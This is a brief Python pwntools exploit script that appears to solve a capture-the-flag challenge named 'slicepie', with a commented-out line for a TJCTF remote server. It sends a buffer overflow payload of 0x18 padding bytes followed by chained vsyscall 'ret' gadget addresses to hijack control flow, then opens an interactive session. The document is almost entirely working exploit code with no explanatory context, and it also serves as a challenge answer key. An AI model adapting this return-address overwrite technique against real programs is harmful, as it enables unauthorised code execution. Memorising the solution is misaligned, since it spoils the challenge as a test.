from pwn import *

a = process('./slicepie')

#a = remote('p1.tjctf.org', '8004')
raw_input('hello')

syscall = 0xffffffffff600007
ret = 0xffffffffff600009
mov = 0xffffffffff600000
a.sendline('40')

buff = 'a'*0x18 + p64(ret) + p64(ret)
# 0x18 = address buff - address ret 9B3
a.sendline(buff)

a.interactive()
